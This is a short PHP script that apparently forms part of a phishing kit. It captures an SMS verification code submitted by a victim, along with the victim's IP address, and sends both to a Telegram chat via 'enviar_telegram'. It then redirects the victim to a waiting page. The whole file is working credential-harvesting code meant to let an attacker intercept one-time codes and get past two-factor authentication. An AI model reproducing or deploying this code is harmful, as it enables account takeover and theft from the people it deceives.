<?php


include '../conf.ini.php';


    $mss = "➖[C0DE-SMS]➖➖➖
💵 C0D3 : {$_POST['controlInput']}
➖➖➖ INFO ➖➖➖
🌐 IP : {$_SERVER['REMOTE_ADDR']}
➖➖➖➖➖➖➖➖➖➖➖➖";

enviar_telegram($mss);

header('location: ../espera.php');

?>
